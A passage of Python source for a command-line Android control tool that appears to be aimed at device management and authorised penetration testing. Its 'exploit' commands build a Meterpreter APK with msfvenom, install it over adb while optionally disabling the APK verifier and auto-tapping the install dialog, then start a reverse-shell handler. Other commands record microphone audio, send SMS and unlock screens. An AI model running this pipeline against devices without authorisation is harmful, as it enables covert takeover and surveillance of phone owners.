    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Write a `settings put global KEY VALUE`."""
    if not yes:
        confirm = typer.confirm(f"settings put global {key} = {value}?")
        if not confirm:
            raise typer.Exit(code=0)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_diag.developer_settings_write(pool.client, target, key, value))
    _print_result_line(result, success_label=f"{key} updated")


# ---------------------------------------------------------------------------
# exploit subcommand group
# ---------------------------------------------------------------------------

exploit_app = typer.Typer(
    help="Metasploit payload generation + handler. Authorized testing only.",
)
app.add_typer(exploit_app, name="exploit")


def _resolve_lhost(explicit: str | None) -> str:
    if explicit:
        return explicit
    ip = cap_net.local_lan_ip()
    if not ip:
        console.print("[err]Could not detect LAN IP. Pass --lhost.[/err]")
        raise typer.Exit(code=2)
    return ip


@exploit_app.command("payload")
def exploit_payload(
    ctx: typer.Context,
    lhost: str | None = typer.Option(None, "--lhost", help="default: auto-detect LAN IP"),
    lport: int = typer.Option(4444, "--lport"),
    payload: str = typer.Option(cap_exploit.DEFAULT_PAYLOAD, "--payload"),
    out: Path = typer.Option(Path("payload.apk"), "--out"),
) -> None:
    """Generate an Android Meterpreter APK via msfvenom."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    tools = locate_tools()
    msfvenom_bin = tools.msfvenom
    if not msfvenom_bin:
        console.print("[err]msfvenom not found. Install metasploit-framework.[/err]")
        raise typer.Exit(code=2)

    host = _resolve_lhost(lhost)
    config = cap_exploit.PayloadConfig(lhost=host, lport=lport, payload=payload, output=out)
    try:
        result_path = cap_exploit.generate_payload(config, msfvenom_bin)
    except (ValueError, RuntimeError, _subprocess.TimeoutExpired) as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Saved:[/ok] {result_path}")
    console.print(f"[muted]LHOST={host} LPORT={lport} payload={payload}[/muted]")


@exploit_app.command("handler")
def exploit_handler(
    ctx: typer.Context,
    lhost: str | None = typer.Option(None, "--lhost"),
    lport: int = typer.Option(4444, "--lport"),
    payload: str = typer.Option(cap_exploit.DEFAULT_PAYLOAD, "--payload"),
) -> None:
    """Run msfconsole with multi/handler attached to this TTY."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    tools = locate_tools()
    msfconsole_bin = tools.msfconsole
    if not msfconsole_bin:
        console.print("[err]msfconsole not found. Install metasploit-framework.[/err]")
        raise typer.Exit(code=2)

    host = _resolve_lhost(lhost)
    try:
        config = cap_exploit.PayloadConfig(lhost=host, lport=lport, payload=payload)
        config.validate()
    except ValueError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=2) from e

    console.print(f"[brand]Starting handler[/brand] LHOST={host} LPORT={lport}")
    rc = cap_exploit.run_handler(msfconsole_bin, config)
    raise typer.Exit(code=rc)


@exploit_app.command("run")
def exploit_run(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
    lhost: str | None = typer.Option(None, "--lhost"),
    lport: int = typer.Option(4444, "--lport"),
    payload: str = typer.Option(cap_exploit.DEFAULT_PAYLOAD, "--payload"),
    out: Path = typer.Option(Path("payload.apk"), "--out"),
    disable_verifier: bool = typer.Option(
        False,
        "--disable-verifier",
        help="Temporarily disable Android APK verifier (restored on exit).",
    ),
    auto_accept: bool = typer.Option(
        False,
        "--auto-accept",
        help="Send dpad-right/right/enter keyevents to step the install dialog.",
    ),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation prompt."),
) -> None:
    """End-to-end: build APK → install → launch → handler.

    Defaults are conservative. `--disable-verifier` and `--auto-accept`
    are opt-in and intended for environments where the operator either
    owns the target device or has explicit written authorization.
    """
    settings: Settings = ctx.obj
    _require_authorized(settings)
    tools = locate_tools()
    msfvenom_bin = tools.msfvenom
    msfconsole_bin = tools.msfconsole
    if not msfvenom_bin or not msfconsole_bin:
        console.print(
            "[err]Metasploit-Framework (msfvenom + msfconsole) not on PATH.[/err]"
        )
        raise typer.Exit(code=2)
    pool, target = _resolve_target(settings, serial)
    host = _resolve_lhost(lhost)

    steps = [
        f"  · msfvenom build  →  [accent]{out}[/accent]",
        f"  · adb install -r on [brand]{target}[/brand]",
        "  · monkey-launch com.metasploit.stage",
        f"  · msfconsole handler on [accent]{host}:{lport}[/accent]",
    ]
    if disable_verifier:
        steps.append("  · [warn]disable[/warn] APK verifier (restored on exit)")
    if auto_accept:
        steps.append("  · auto-tap install dialog")

    console.print(
        Panel(
            "[warn]Authorized testing only.[/warn] About to:\n" + "\n".join(steps),
            title="exploit run",
            border_style="yellow",
        )
    )
    if not yes and not typer.confirm("Continue?"):
        raise typer.Exit(code=0)

    config = cap_exploit.PayloadConfig(lhost=host, lport=lport, payload=payload, output=out)
    try:
        cap_exploit.generate_payload(config, msfvenom_bin)
    except (ValueError, RuntimeError, _subprocess.TimeoutExpired) as e:
        console.print(f"[err]msfvenom: {e}[/err]")
        raise typer.Exit(code=1) from e
    console.print(f"[ok]Payload built:[/ok] {out}")

    if disable_verifier:
        asyncio.run(cap_exploit.set_verifier(pool.client, target, enabled=False))
        console.print("[muted]Verifier disabled (will restore on exit).[/muted]")

    try:
        install = asyncio.run(cap_exploit.install_payload(pool.client, target, out))
        if not install.ok:
            detail = install.stderr.strip() or install.stdout.strip() or "no output"
            console.print(f"[err]adb install failed:[/err] {detail}")
            return
        console.print("[ok]Payload installed.[/ok]")

        if auto_accept:
            asyncio.run(cap_exploit.auto_accept_install_dialog(pool.client, target))
            console.print("[muted]Install-dialog keyevents sent.[/muted]")

        launch = asyncio.run(cap_exploit.launch_payload(pool.client, target))
        if launch.ok:
            console.print("[ok]Payload launched.[/ok]")
        else:
            console.print("[warn]Launch result unclear; check device.[/warn]")

        console.print(
            "[brand]Starting handler.[/brand] Use Ctrl-C inside msfconsole to exit."
        )
        rc = cap_exploit.run_handler(msfconsole_bin, config)
        if rc != 0:
            console.print(f"[warn]msfconsole exited with code {rc}.[/warn]")
    finally:
        if disable_verifier:
            asyncio.run(cap_exploit.set_verifier(pool.client, target, enabled=True))
            console.print("[muted]Verifier restored.[/muted]")


# ---------------------------------------------------------------------------
# cluster subcommand group — fan-out across multiple devices
# ---------------------------------------------------------------------------

cluster_app = typer.Typer(help="Run one action across many devices in parallel.")
app.add_typer(cluster_app, name="cluster")


def _resolve_cluster(
    settings: Settings,
    serials: str | None,
    all_devices: bool,
) -> tuple[DevicePool, list[str]]:
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    ready = [d.serial for d in pool.devices if d.ready]
    if serials:
        wanted = [s.strip() for s in serials.split(",") if s.strip()]
        unknown = [s for s in wanted if s not in ready]
        if unknown:
            console.print(f"[err]Unknown serials: {', '.join(unknown)}[/err]")
            raise typer.Exit(code=2)
        return pool, wanted
    if all_devices:
        if not ready:
            console.print("[err]No ready devices.[/err]")
            raise typer.Exit(code=2)
        return pool, ready
    console.print("[err]Pass --all or --serials a,b,c[/err]")
    raise typer.Exit(code=2)


@cluster_app.command("info")
def cluster_info(
    ctx: typer.Context,
    serials: str | None = typer.Option(None, "--serials", help="Comma-separated"),
    all_devices: bool = typer.Option(False, "--all"),
) -> None:
    """Fetch device info from many devices at once."""
    pool, targets = _resolve_cluster(ctx.obj, serials, all_devices)

    async def _one(serial: str) -> tuple[str, cap_info.DeviceInfo]:
        return serial, await cap_info.collect_info(pool.client, serial)

    pairs = asyncio.run(pool.gather(lambda s: _one(s), serials=targets))

    table = Table(title=f"Cluster info ({len(targets)} device(s))", header_style="accent")
    table.add_column("Serial", style="brand")
    table.add_column("Model", style="ok")
    table.add_column("Android", style="accent")
    table.add_column("SDK", style="muted")
    table.add_column("Security patch", style="muted")
    for serial, info in pairs:
        table.add_row(
            serial,
            f"{info.manufacturer} {info.model}".strip() or "—",
            info.android_version or "—",
            info.sdk or "—",
            info.security_patch or "—",
        )
    console.print(table)


@cluster_app.command("screenshot")
def cluster_screenshot(
    ctx: typer.Context,
    serials: str | None = typer.Option(None, "--serials"),
    all_devices: bool = typer.Option(False, "--all"),
    out_dir: Path | None = typer.Option(None, "--out"),
) -> None:
    """Capture screenshots from many devices in parallel."""
    settings: Settings = ctx.obj
    pool, targets = _resolve_cluster(settings, serials, all_devices)
    dest_root = out_dir or settings.captures_dir
    settings.ensure_dirs()

    async def _one(serial: str) -> tuple[str, str]:
        sub = dest_root / serial.replace(":", "_")
        local = await cap_media.screenshot(pool.client, serial, sub)
        return serial, str(local)

    results = asyncio.run(pool.gather(lambda s: _one(s), serials=targets))
    for serial, path in results:
        console.print(f"[ok]{serial}[/ok]  {path}")


@cluster_app.command("shell")
def cluster_shell(
    ctx: typer.Context,
    command: str = typer.Argument(..., help="Shell command to run on each device"),
    serials: str | None = typer.Option(None, "--serials"),
    all_devices: bool = typer.Option(False, "--all"),
) -> None:
    """Run one shell command on many devices in parallel."""
    pool, targets = _resolve_cluster(ctx.obj, serials, all_devices)

    async def _one(serial: str) -> tuple[str, AdbResult]:
        return serial, await cap_shell.run_command(pool.client, serial, command)

    pairs = asyncio.run(pool.gather(lambda s: _one(s), serials=targets))

    table = Table(title=f"`{command}` across {len(targets)} device(s)", header_style="accent")
    table.add_column("Serial", style="brand")
    table.add_column("rc", style="ok", justify="right")
    table.add_column("stdout (head)", style="muted")
    for serial, result in pairs:
        head = (result.stdout.strip().splitlines() or [""])[0][:90]
        table.add_row(serial, str(result.returncode), head or "—")
    console.print(table)


# ---------------------------------------------------------------------------
# audit subcommand group
# ---------------------------------------------------------------------------

audit_app = typer.Typer(help="View / manage the SQLite audit log.")
app.add_typer(audit_app, name="audit")


@audit_app.command("tail")
def audit_tail(
    ctx: typer.Context,
    limit: int = typer.Option(50, "--limit", "-n"),
) -> None:
    """Show the most recent audit events."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    settings.ensure_dirs()
    log = AuditLog(settings.audit_db)
    rows = log.tail(limit=limit)
    if not rows:
        console.print("[muted](no audit events)[/muted]")
        return

    table = Table(title=f"Audit (last {len(rows)})", header_style="accent")
    table.add_column("id", style="muted", justify="right")
    table.add_column("when", style="muted")
    table.add_column("operator@host", style="brand")
    table.add_column("capability", style="ok")
    table.add_column("serial", style="accent")
    table.add_column("rc", justify="right")
    table.add_column("ms", justify="right")
    from datetime import datetime

    for row in rows:
        ts = datetime.fromtimestamp(row["ts"]).strftime("%Y-%m-%d %H:%M:%S")
        table.add_row(
            str(row["id"]),
            ts,
            f"{row['operator']}@{row['host']}",
            row["capability"],
            row["serial"] or "—",
            str(row["exit_code"]),
            f"{row['duration_ms']:.0f}",
        )
    console.print(table)


@audit_app.command("path")
def audit_path(ctx: typer.Context) -> None:
    """Show the audit database path."""
    settings: Settings = ctx.obj
    console.print(str(settings.audit_db))


@audit_app.command("clear")
def audit_clear(
    ctx: typer.Context,
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Delete all events from the audit log."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    if not yes and not typer.confirm("Erase all audit events? Cannot be undone."):
        raise typer.Exit(code=0)
    settings.ensure_dirs()
    log = AuditLog(settings.audit_db)
    removed = log.clear()
    console.print(f"[ok]Deleted {removed} event(s).[/ok]")


# ---------------------------------------------------------------------------
# media subcommand group — scrcpy mirror + audio
# ---------------------------------------------------------------------------

media_app = typer.Typer(help="scrcpy-backed mirroring + audio capture.")
app.add_typer(media_app, name="media")

audio_app = typer.Typer(help="Audio stream / record (Android 11+).")
media_app.add_typer(audio_app, name="audio")


def _require_scrcpy() -> str:
    tools = locate_tools()
    if not tools.scrcpy:
        console.print("[err]scrcpy not found on PATH.[/err]")
        raise typer.Exit(code=2)
    return tools.scrcpy


def _resolve_serial_only(settings: Settings, serial: str | None) -> str:
    _, target = _resolve_target(settings, serial)
    return target


@media_app.command("mirror")
def media_mirror(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
    max_size: int | None = typer.Option(None, "-m", "--max-size"),
    bitrate: float | None = typer.Option(None, "-b", "--bitrate-mbps"),
    fps: int | None = typer.Option(None, "--max-fps"),
) -> None:
    """Mirror + control the device with scrcpy. Blocks until you close."""
    scrcpy_path = _require_scrcpy()
    target = _resolve_serial_only(ctx.obj, serial)
    code = cap_media.mirror(
        scrcpy_path,
        serial=target,
        max_size=max_size,
        bitrate_mbps=bitrate,
        max_fps=fps,
    )
    raise typer.Exit(code=code)


@audio_app.command("stream")
def audio_stream(
    ctx: typer.Context,
    source: str = typer.Argument("device", help="mic | device"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Live audio stream via scrcpy (no video). Android 11+."""
    if source not in {"mic", "device"}:
        console.print("[err]source must be 'mic' or 'device'[/err]")
        raise typer.Exit(code=2)
    scrcpy_path = _require_scrcpy()
    target = _resolve_serial_only(ctx.obj, serial)
    code = cap_media.stream_audio(scrcpy_path, source, serial=target)  # type: ignore[arg-type]
    raise typer.Exit(code=code)


@audio_app.command("record")
def audio_record(
    ctx: typer.Context,
    source: str = typer.Argument("device", help="mic | device"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    out: Path | None = typer.Option(None, "--out"),
    play: bool = typer.Option(False, "--play", help="Play locally while recording"),
) -> None:
    """Record audio to a file via scrcpy. Android 11+."""
    if source not in {"mic", "device"}:
        console.print("[err]source must be 'mic' or 'device'[/err]")
        raise typer.Exit(code=2)
    scrcpy_path = _require_scrcpy()
    settings: Settings = ctx.obj
    target = _resolve_serial_only(settings, serial)

    if out is None:
        settings.ensure_dirs()
        from datetime import datetime
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        name = f"audio-{source}-{target.replace(':', '_')}-{stamp}.opus"
        out = settings.captures_dir / name

    console.print(f"[muted]Ctrl-C to stop. Saving to {out}[/muted]")
    code = cap_media.record_audio(
        scrcpy_path,
        source,  # type: ignore[arg-type]
        out,
        serial=target,
        play_while_recording=play,
    )
    if code == 0:
        console.print(f"[ok]Saved:[/ok] {out}")
    raise typer.Exit(code=code)


# ---------------------------------------------------------------------------
# comms subcommand group — SMS / open link
# ---------------------------------------------------------------------------

comms_app = typer.Typer(help="Telephony + intent helpers (SMS, open URL).")
app.add_typer(comms_app, name="comms")


@comms_app.command("sms")
def comms_sms(
    ctx: typer.Context,
    number: str = typer.Argument(..., help="E.164 phone (e.g. +14155550199)"),
    message: str = typer.Argument(...),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Send an SMS. BETA — varies by Android version / OEM."""
    if not yes and not typer.confirm(
        f"Send SMS to {number}? Carrier may bill the device."
    ):
        raise typer.Exit(code=0)
    pool, target = _resolve_target(ctx.obj, serial)
    try:
        result = asyncio.run(cap_comms.send_sms(pool.client, target, number, message))
    except ValueError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=2) from e
    _print_result_line(result, success_label=f"SMS dispatched to {number}")


@comms_app.command("open")
def comms_open(
    ctx: typer.Context,
    url: str = typer.Argument(..., help="https://, http://, tel:, mailto:, geo:, intent:"),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Open a URL on the device via the default VIEW intent."""
    pool, target = _resolve_target(ctx.obj, serial)
    try:
        result = asyncio.run(cap_comms.open_link(pool.client, target, url))
    except ValueError as e:
        console.print(f"[err]{e}[/err]")
        raise typer.Exit(code=2) from e
    _print_result_line(result, success_label=f"Opened {url}")


# ---------------------------------------------------------------------------
# keycodes — interactive REPL for one-off keyevent sends
# ---------------------------------------------------------------------------

_KEY_MAP: dict[str, tuple[str, str]] = {
    "1":  ("HOME",            "3"),
    "2":  ("BACK",            "4"),
    "3":  ("RECENT_APPS",     "187"),
    "4":  ("POWER",           "26"),
    "5":  ("ENTER",           "66"),
    "6":  ("DEL",             "67"),
    "7":  ("ESC",             "111"),
    "8":  ("TAB",             "61"),
    "9":  ("VOL_UP",          "24"),
    "10": ("VOL_DOWN",        "25"),
    "11": ("DPAD_UP",         "19"),
    "12": ("DPAD_DOWN",       "20"),
    "13": ("DPAD_LEFT",       "21"),
    "14": ("DPAD_RIGHT",      "22"),
    "15": ("MEDIA_PLAY",      "126"),
    "16": ("MEDIA_PAUSE",     "127"),
    "17": ("CAMERA",          "27"),
    "18": ("BRIGHTNESS_UP",   "221"),
    "19": ("BRIGHTNESS_DOWN", "220"),
}


def _render_keycode_menu() -> None:
    table = Table(title="Keycodes", header_style="accent")
    table.add_column("#", style="muted", justify="right")
    table.add_column("Name", style="brand")
    table.add_column("Code", style="ok", justify="right")
    for idx, (label, code) in _KEY_MAP.items():
        table.add_row(idx, label, code)
    console.print(table)
    console.print(
        "[muted]Type number to send. Or:  t TEXT  to type text.  "
        "k CODE  for any numeric keycode.  q to quit.[/muted]"
    )


@app.command("keycodes")
def keycodes_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Interactive keycode / text sender."""
    pool, target = _resolve_target(ctx.obj, serial)
    _render_keycode_menu()

    while True:
        try:
            choice = console.input("[prompt]keycode>[/prompt] ").strip()
        except (EOFError, KeyboardInterrupt):
            console.print()
            return
        if not choice or choice == "q":
            return
        if choice == "?":
            _render_keycode_menu()
            continue

        parts = choice.split(maxsplit=1)
        head = parts[0].lower()

        if head == "t":
            if len(parts) != 2 or not parts[1]:
                console.print("[err]usage: t TEXT[/err]")
                continue
            result = asyncio.run(cap_shell.send_text(pool.client, target, parts[1]))
            _print_result_line(result, success_label=f"typed {parts[1]!r}")
            continue

        if head == "k":
            if len(parts) != 2 or not parts[1].isdigit():
                console.print("[err]usage: k NUMERIC_CODE[/err]")
                continue
            result = asyncio.run(
                cap_shell.send_keycode(pool.client, target, int(parts[1]))
            )
            _print_result_line(result, success_label=f"keycode {parts[1]} sent")
            continue

        if choice in _KEY_MAP:
            label, code = _KEY_MAP[choice]
            result = asyncio.run(cap_shell.send_keycode(pool.client, target, int(code)))
            _print_result_line(result, success_label=f"{label} ({code}) sent")
            continue

        console.print("[err]Unknown. ? menu  q quit[/err]")


# ---------------------------------------------------------------------------
# device power: reboot / power-off / lock / unlock
# ---------------------------------------------------------------------------

@app.command("reboot")
def reboot_cmd(
    ctx: typer.Context,
    target: str = typer.Argument(
        "system",
        help="system | recovery | bootloader | fastboot",
    ),
    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Reboot the device. Default: normal restart."""
    if target not in {"system", "recovery", "bootloader", "fastboot"}:
        console.print("[err]target must be: system | recovery | bootloader | fastboot[/err]")
        raise typer.Exit(code=2)
    if not yes and not typer.confirm(
        f"Reboot to [{target}]? Will drop ADB connection."
    ):
        raise typer.Exit(code=0)
    pool, target_serial = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_device.reboot(pool.client, target_serial, target))  # type: ignore[arg-type]
    _print_result_line(result, success_label=f"rebooting to {target}")


@app.command("power-off")
def power_off_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
    yes: bool = typer.Option(False, "--yes", "-y"),
) -> None:
    """Power the device off."""
    if not yes and not typer.confirm(
        "Power off the device? Will drop ADB connection until reboot."
    ):
        raise typer.Exit(code=0)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_device.power_off(pool.client, target))
    _print_result_line(result, success_label="powering off")


@app.command("lock")
def lock_cmd(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Lock the screen (sends power keyevent)."""
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(cap_device.lock_device(pool.client, target))
    _print_result_line(result, success_label="locked")


@app.command("unlock")
def unlock_cmd(
    ctx: typer.Context,
    pin: str = typer.Option(
        "",
        "--pin",
        help="PIN/password if device is secured. Operator must know it.",
    ),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Wake screen, swipe up, enter PIN/password if provided."""
    pool, target = _resolve_target(ctx.obj, serial)
    asyncio.run(cap_device.unlock_device(pool.client, target, pin or None))
    console.print("[ok]Unlock sequence sent.[/ok]")


# ---------------------------------------------------------------------------
# media play (push + open via VIEW intent)
# ---------------------------------------------------------------------------

@media_app.command("play")
def media_play(
    ctx: typer.Context,
    kind: str = typer.Argument(..., help="photo | audio | video"),
    local: Path = typer.Argument(..., exists=True, readable=True, dir_okay=False),
    serial: str | None = typer.Option(None, "--serial", "-s"),
) -> None:
    """Push a media file to /sdcard/ and open it on the device."""
    if kind not in {"photo", "audio", "video"}:
        console.print("[err]kind must be 'photo', 'audio', or 'video'[/err]")
        raise typer.Exit(code=2)
    pool, target = _resolve_target(ctx.obj, serial)
    result = asyncio.run(
        cap_device.push_and_open_media(pool.client, target, kind, str(local))  # type: ignore[arg-type]
    )
    _print_result_line(result, success_label=f"opened {local.name}")


# ---------------------------------------------------------------------------
# logcat follow (live stream)
# ---------------------------------------------------------------------------

@export_app.command("logcat-follow")
def export_logcat_follow(
    ctx: typer.Context,
    serial: str | None = typer.Option(None, "--serial", "-s"),
    filter_spec: str | None = typer.Option(None, "--filter", help="e.g. *:W or TAG:S"),
) -> None:
    """Stream live logcat. Ctrl-C to stop."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    pool = _new_pool(adb)
    asyncio.run(pool.refresh())
    if serial:
        pool.select(serial)
    target = pool.require_active()
    console.print(f"[muted]Streaming logcat for {target}. Ctrl-C to stop.[/muted]")
    rc = cap_exports.stream_logcat(adb, target, filter_spec=filter_spec)
    raise typer.Exit(code=rc)


# ---------------------------------------------------------------------------
# connect kill-server
# ---------------------------------------------------------------------------

@connect_app.command("kill-server")
def connect_kill_server(ctx: typer.Context) -> None:
    """Stop the ADB server (`adb kill-server`)."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_connect.kill_server(client))
    _print_result_line(result, success_label="ADB server stopped")


@connect_app.command("start-server")
def connect_start_server(ctx: typer.Context) -> None:
    """Start the ADB server (`adb start-server`)."""
    settings: Settings = ctx.obj
    _require_authorized(settings)
    adb = _require_adb()
    client = AdbClient(adb)
    result = asyncio.run(cap_connect.start_server(client))
    _print_result_line(result, success_label="ADB server started")
